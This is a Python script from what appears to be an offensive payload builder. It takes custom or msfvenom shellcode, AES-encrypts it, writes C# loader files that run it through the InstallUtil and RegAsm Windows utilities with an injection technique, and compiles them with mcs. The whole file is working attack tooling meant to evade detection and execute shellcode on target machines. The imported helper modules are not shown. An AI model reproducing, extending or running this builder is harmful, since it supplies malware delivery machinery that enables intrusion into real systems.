from lib.init import *
from lib.args import *
from lib.encrypt import *
from lib.csharpgen import *

script_path = os.path.dirname(os.path.abspath(__file__))

def main():

    # choose custom or msfvenom shellcode 
    shellcode_hex = choose_shellcode(args.custom)

    # AES encrypt shellcode 
    encrypted_base64_blob = aes_encrypt_shellcode(shellcode_hex)
    print(Fore.GREEN + Style.BRIGHT + "[*] Encrypted Base64 Shellcode:", encrypted_base64_blob)

    # generate payload for binaries
    for binary in binaries:
        match binary:
            case "InstallUtil":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted_base64_blob, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{script_path}/payload_{binary}.cs")

                compile = mcs_compile(f"mcs -r:System.Configuration.Install.dll -target:exe -platform:{args.arch} payload_{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{script_path}/payload_{binary}")

            case "RegAsm":
                print()
                print(Fore.CYAN + Style.BRIGHT + f"[*] Generating Payload for {binary.upper()}!")

                generate_cs_file(binary, encrypted_base64_blob, injection_technique)
                print(Fore.GREEN + Style.BRIGHT + "[*] C# File Generated:", f"{script_path}/payload_{binary}.cs")

                compile = mcs_compile(f"mcs -r:System.EnterpriseServices.dll -target:library -platform:{args.arch} -keyfile:lib/key.snk payload_{binary}.cs")
                if(compile):
                    print(Fore.GREEN + Style.BRIGHT + "[*] Payload dll/exe Generated:", f"{script_path}/payload_{binary}")


if __name__ == '__main__':
    main()